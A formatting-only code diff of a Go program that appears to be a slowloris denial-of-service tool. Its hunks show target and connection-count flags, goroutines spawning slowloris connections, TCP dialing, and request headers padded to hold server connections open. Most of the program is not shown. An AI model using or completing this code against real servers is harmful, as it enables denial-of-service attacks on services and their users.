@@ -1,15 +1,15 @@
 package main
 
 import (
-	"fmt"
-	"net"
 	"bytes"
+	"flag"
+	"fmt"
 	"io"
-	"time"
+	"net"
 	"os"
 	"os/signal"
 	"strings"
-	"flag"
+	"time"
 )
 
 const (
@@ -18,16 +18,16 @@ const (
 
 var (
 	numConnections int
-	interval int
-	method string
-	resource string
-	userAgent string
-	target string
+	interval       int
+	method         string
+	resource       string
+	userAgent      string
+	target         string
 )
 
 func main() {
 	parseParams()
-	if len(flag.Args()) == 0  {
+	if len(flag.Args()) == 0 {
 		usage()
 		os.Exit(-1)
 	}
@@ -73,7 +73,7 @@ func usage() {
 }
 
 func openConnections(target string, num int) {
-	for i:=0; i<num; i++ {
+	for i := 0; i < num; i++ {
 		go slowloris(target, interval)
 	}
 }
@@ -85,10 +85,10 @@ loop:
 		conn, err := net.Dial("tcp", target)
 		if err != nil {
 			continue
-		} 
+		}
 		defer conn.Close()
 
-		host := target 
+		host := target
 		headers := makeHeaders(host)
 		req := createRequest(host, method, resource, headers)
 		_, err = io.Copy(conn, req)
@@ -124,7 +124,7 @@ func makeHeaders(host string) map[string]string {
 	headers := make(map[string]string)
 
 	headers["Host"] = host
-	headers["User-Agent"] = defaultUserAgent 
+	headers["User-Agent"] = defaultUserAgent
 	headers["Content-Length"] = "42"
 
 	return headers
